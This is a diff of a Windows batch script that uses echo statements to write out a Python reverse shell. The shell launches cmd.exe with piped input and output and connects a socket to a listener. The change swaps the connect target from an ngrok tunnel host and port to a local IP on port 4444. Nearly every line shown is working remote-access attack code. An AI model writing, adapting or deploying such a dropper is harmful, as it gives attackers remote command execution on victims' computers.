@@ -16,7 +16,7 @@ echo            echo    p = sp.Popen^^(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIP
 echo            echo    s = socket.socket^^(^^) >> pro1.bat
 echo            echo. >> pro1.bat
 echo            echo    try^^: >> pro1.bat
-echo            echo        s.connect^^(^^('0.tcp.eu.ngrok.io', 15460^^)^^) >> pro1.bat
+echo            echo        s.connect^^(^^('192.168.1.16', 4444^^)^^) >> pro1.bat
 echo            echo    except ConnectionRefusedError as e^^: >> pro1.bat
 echo            echo        print^^('refused ... Check if listener is running.'^^) >> pro1.bat
 echo            echo        return >> pro1.bat
